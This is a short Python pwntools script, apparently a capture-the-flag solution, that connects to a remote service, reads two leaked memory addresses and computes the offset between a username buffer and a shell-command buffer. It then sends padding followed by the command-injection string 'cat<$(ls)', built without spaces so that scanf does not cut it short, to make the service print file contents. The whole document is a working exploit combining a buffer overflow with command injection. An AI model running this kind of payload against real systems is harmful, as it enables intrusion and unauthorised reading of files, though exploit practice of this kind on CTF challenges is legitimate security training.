from pwn import *

hostname = ...
port = ...
p = remote(hostname, port)

# Compute offset required to overwrite
username_addr = int(p.recvline().split()[-1], 16)
shell_addr = int(p.recvline().split()[-1], 16)
diff = shell_addr - username_addr

p.recvuntil(b"username: ")

# Scanf stops at first whitespace
# This payload cats the result of ls without spaces
name = b"a"*diff + b"cat<$(ls)"
p.sendline(name)

res = p.recvline()
print(res)